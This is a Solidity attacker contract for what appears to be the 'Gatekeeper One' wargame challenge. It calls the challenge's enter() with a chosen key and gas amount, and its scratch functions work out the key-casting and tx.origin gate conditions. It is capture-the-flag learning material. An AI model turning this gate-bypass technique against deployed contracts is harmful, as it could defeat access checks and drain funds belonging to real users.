pragma solidity ^0.7.3;
/**
* Attack contract boilerplate template. 
* Useful to create an attack contract for a new challenge without accidentally
* peaking at the solution.
*/

interface IGatekeeperOneChallenge {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    // Only the constructor and attack() are relevant here. Everything else were scratch
    // functions to help me reason about what was happening
    IGatekeeperOneChallenge public challenge;

    uint32 public gateOneA;
    uint16 public gateOneB;

    uint32 public gateTwoA;
    uint64 public gateTwoB;

    uint16 public gateThreeA;
    
    bytes8 _gateKey;

    constructor(address challengeAddress) {
        challenge = IGatekeeperOneChallenge(challengeAddress);
    }

    function attack(bytes8 key, uint _gas) public returns (bool) {
        // Maybe use a .call here so that we can specify the gas to use
        // in a more direct way?
        challenge.enter{gas: _gas}(key);
    }
    

    function setKey(bytes8 key) public {
        _gateKey = key;
    }

    function gateOne() public {
        gateOneA = uint32(uint64(_gateKey)); 
        gateOneB = uint16(uint64(_gateKey)); 
    }

    function gateTwo() public {
        gateTwoA = uint32(uint64(_gateKey)); // Same as 3A
        gateTwoB = uint64(_gateKey);
    }
    function gateThree() public {
        gateThreeA = uint16(tx.origin);
    }
}
